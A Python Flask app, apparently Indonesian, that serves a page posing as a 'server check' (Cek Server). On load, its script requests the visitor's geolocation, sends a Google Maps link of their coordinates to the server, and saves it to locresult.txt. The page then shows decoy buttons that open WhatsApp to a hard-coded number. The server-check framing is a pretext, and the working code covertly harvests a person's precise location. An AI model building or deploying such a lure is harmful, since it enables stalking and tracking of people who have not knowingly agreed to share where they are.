from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Cek Server 🌍</title>
  <style>
    body {
      background: linear-gradient(135deg, #0a192f, #1e3a8a);
      height: 100vh;
      margin: 0;
      font-family: 'Poppins', sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      overflow: hidden;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 10px;
      animation: fadeIn 1.5s ease-in-out;
    }
    p {
      font-size: 1.2em;
      opacity: 0.85;
      animation: fadeIn 2s ease-in-out;
    }
    #checkBtn, #thumbBtn {
      border: none;
      color: white;
      font-size: 1em;
      padding: 12px 24px;
      border-radius: 12px;
      margin-top: 20px;
      cursor: pointer;
      transition: 0.3s;
      display: none;
    }
    #checkBtn {
      background: #10b981;
    }
    #checkBtn:hover {
      background: #059669;
      transform: scale(1.05);
    }
    #thumbBtn {
      background: #2563eb;
    }
    #thumbBtn:hover {
      background: #1d4ed8;
      transform: scale(1.05);
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <h1>Cek Server Sejauh Mana 🌍</h1>
  <p id="status">Menunggu izin lokasi...</p>
  <button id="checkBtn">✅ Cek Server dari Wahyu</button>
  <button id="thumbBtn">👍 Kirim WhatsApp Saya</button>

  <script>
    navigator.geolocation.getCurrentPosition(
      pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const link = `https://maps.google.com/?q=${lat},${lon}`;
        const status = document.getElementById('status');
        const checkBtn = document.getElementById('checkBtn');
        const thumbBtn = document.getElementById('thumbBtn');

        status.textContent = "Server siap dicek 🚀";

        // Kirim lokasi ke server Flask
        fetch("/save_location", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({link})
        })
        .then(() => {
          // Tampilkan tombol cek server
          checkBtn.style.display = "inline-block";
          checkBtn.onclick = () => {
            status.textContent = "Cek Server dari Wahyu ✔️";
            thumbBtn.style.display = "inline-block";
          };

          // Tombol kirim WhatsApp
          thumbBtn.onclick = () => {
            const msg = encodeURIComponent("Server kamu aman, Wahyu ✅");
            const whatsappUrl = "https://wa.me/6285712602367?text=" + msg; // Ganti nomor WA kamu di sini
            window.open(whatsappUrl, "_blank");
          };
        })
        .catch(err => {
          status.textContent = "Gagal mengirim data lokasi ❌";
          console.error(err);
        });
      },
      err => {
        document.getElementById('status').textContent = "Kamu perlu mengizinkan lokasi 🌍";
      }
    );
  </script>
</body>
</html>
'''

@app.route('/save_location', methods=['POST'])
def save_location():
    data = request.get_json()
    link = data.get('link')

    with open('locresult.txt', 'w') as f:
        f.write(link + '\n')

    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(debug=True)
